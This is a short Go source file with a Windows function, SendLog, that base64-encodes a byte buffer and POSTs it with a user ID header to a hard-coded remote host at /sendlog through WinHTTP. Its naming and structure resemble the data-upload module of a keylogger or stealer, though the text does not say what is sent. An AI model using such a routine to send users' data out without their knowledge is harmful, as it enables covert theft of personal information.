package main

import (
	"encoding/base64"
)

func SendLog(a []byte, userman string) {
	str := base64.URLEncoding.EncodeToString(a)
	contenttype := "Content-Type: application/x-www-form-urlencoded"
	userid := "Userid: " + userman
	h := WinHttpOpen("")
	s := WinHttpConnect(h, DOMAIN_SEND, DOMAIN_PORT)
	parampost := []byte("B64=" + str)
	m_hRequest := WinHttpOpenRequest(s, "POST", "/sendlog")
	WinHttpAddRequestHeaders(m_hRequest, contenttype, 0x20000000)
	WinHttpAddRequestHeaders(m_hRequest, userid, 0x20000000)
	WinHttpSendRequest(m_hRequest, parampost, len(parampost))
}
